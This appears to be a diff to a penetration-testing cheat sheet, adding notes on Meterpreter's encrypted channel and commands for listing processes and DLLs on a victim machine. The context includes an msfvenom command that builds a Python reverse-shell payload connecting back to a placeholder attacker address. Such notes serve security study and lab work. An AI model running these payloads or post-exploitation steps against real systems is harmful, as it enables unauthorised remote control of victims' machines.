@@ -98,5 +98,15 @@ Python
         msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
 
 ----- Meterpreter  (Lives in Memory) -----    
+Meterpreter will establish an encrypted (TLS) communication channel with the attacker's system
+
+meterpreter >   getpid      <-- get current process meterepeters running in
+meterpreter >   ps          <-- Lists Processes on Victim machine
+C:\Windows\system32> tasklist /m /fi "pid eq 1304"   <-- View DLLs for PID 1304
+
+
+
+
+
 
 
